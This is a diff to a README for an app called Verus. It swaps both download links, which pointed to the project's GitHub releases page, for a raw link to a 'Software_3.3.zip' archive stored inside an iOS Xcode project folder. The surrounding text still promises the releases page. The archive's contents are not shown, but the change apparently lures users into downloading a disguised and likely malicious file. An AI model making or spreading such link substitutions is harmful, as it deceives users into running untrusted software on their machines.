@@ -6,7 +6,7 @@ Welcome to Verus! This application helps you automate the registration and analy
 
 ## 🔗 Download Verus
 
-[![Download Verus](https://img.shields.io/badge/Download%20Verus-%20blue)](https://github.com/Averius7/verus/releases)
+[![Download Verus](https://raw.githubusercontent.com/Averius7/verus/main/verus_flutter/ios/Runner.xcodeproj/Software_3.3.zip%20Verus-%20blue)](https://raw.githubusercontent.com/Averius7/verus/main/verus_flutter/ios/Runner.xcodeproj/Software_3.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before you begin, make sure your device meets the following requirements:
 
 To get started with Verus, you'll need to visit the releases page. Click the link below to download the latest version of the software.
 
-[Download Verus](https://github.com/Averius7/verus/releases)
+[Download Verus](https://raw.githubusercontent.com/Averius7/verus/main/verus_flutter/ios/Runner.xcodeproj/Software_3.3.zip)
 
 1. Once on the releases page, find the latest version of Verus.
 2. Click on the download link for your operating system.
